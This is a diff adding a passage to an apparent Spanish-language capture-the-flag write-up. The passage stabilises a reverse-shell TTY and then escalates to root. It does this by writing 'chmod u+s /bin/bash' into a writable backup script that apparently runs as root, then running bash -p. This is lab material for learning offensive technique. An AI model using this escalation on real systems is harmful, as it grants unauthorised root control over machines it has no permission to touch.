@@ -66,6 +66,22 @@ Ahora nos ponemos a revisar los directorios básicos que siempre debemos revisar
 
 Para dejar la tty 100% estable, hacemos el típico tratamiento de la tty de la siguienta manera:
 
+```bash
+script /dev/null -c bash
+CTRL + Z
+stty raw -echo;fg
+reset xterm
+export TERM=xterm && export SHELL=bash
+stty rows 50 columns 236
+```
+Ahora si podemos dirigirnos y modificar la shell que habíamos encontrado en /var/backup, daremos el siguiente comando para que convertir el binario /bin/bash en SUID, esto con el fin de poder realizar un bash -p y ser root.
 
+```bash
+echo "chmod u+s /bin/bash" > backup.sh
+```
+<img width="678" height="500" alt="bypassme14" src="https://github.com/user-attachments/assets/303a3217-7c22-4fff-af6c-77ffb77ccea7" />
 
+<img width="595" height="230" alt="bypassme15" src="https://github.com/user-attachments/assets/455dc4c6-7f2b-4cfd-8624-39817e7bbe82" />
+
+¡Finalmente ya somos root!, máquina hackeada.
 
